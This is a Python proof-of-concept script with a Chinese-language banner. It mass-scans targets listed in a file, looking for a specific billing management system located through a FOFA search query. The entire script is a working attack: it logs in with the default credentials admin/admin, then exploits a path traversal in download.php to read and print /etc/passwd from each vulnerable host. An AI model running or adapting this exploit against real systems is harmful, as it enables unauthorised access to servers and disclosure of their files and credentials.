import requests
import sys
import random
import re
from requests.packages.urllib3.exceptions import InsecureRequestWarning

def title():
    print('+------------------------------------------')
    print('+  \033[31m公众号 : 深夜笔记本                                                  \033[0m')
    print('+  \033[31mVersion: 蓝海卓越计费管理系统漏洞探测                                   \033[0m')
    print('+  \033[31m使用格式:  python3 poc.py                                           \033[0m')
    print('+  \033[31mfofa：       fofa：ttitle="蓝海卓越计费管理系统"                        \033[0m')
    print('+  \033[36m文件        >>> url.txt                                              \033[0m')
    print('+------------------------------------------')

def POC_1(target_url):
    url = target_url + "/login_check.php"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    data = "username=admin&pwd=admin"
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        r = requests.post(url=url, headers=headers, data=data, verify=False, timeout=5)
        if "ok" in r.text and r.status_code == 200:
            print("\033[32m[o] 目标 {} 存在漏洞弱口令漏洞 ,密码为：admin\n \033[0m".format(target_url))
            POC_2(target_url)
        else:
            print("\033[31m[x] 不存在漏洞 \033[0m")

    except Exception as e:
        print("\033[31m[x] 请求失败 \033[0m", e)


def POC_2(target_url):
    url = target_url + "/download.php?file=../../../../..//etc/passwd"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        r = requests.post(url=url, headers=headers, verify=False, timeout=5)
        if "root" in r.text and r.status_code == 200:
            print("\033[32m[o] 目标 {} 存在漏洞 ,查看etc/passwd, 响应为:\n{} \033[0m".format(target_url, r.text))
        else:
            print("\033[31m[x] 不存在漏洞 \033[0m")
    except Exception as e:
        print("\033[31m[x] 请求失败 \033[0m", e)

def xcan(file):
    with open(file, "r", encoding='utf8') as scan_url:
        for url in scan_url:
            if url[:4] != "http":
                url = "http://" + url
            url = url.strip('\n')
            try:
                POC_1(url)

            except Exception as e:
                print("\033[31m[x] 请求报错 \033[0m".format(e))
                continue

if __name__ == '__main__':
    title()
    file_name = str(input("\033[36m请输入文件路劲\ntxt.路劲 >>> \033[0m"))
    xcan(file_name)
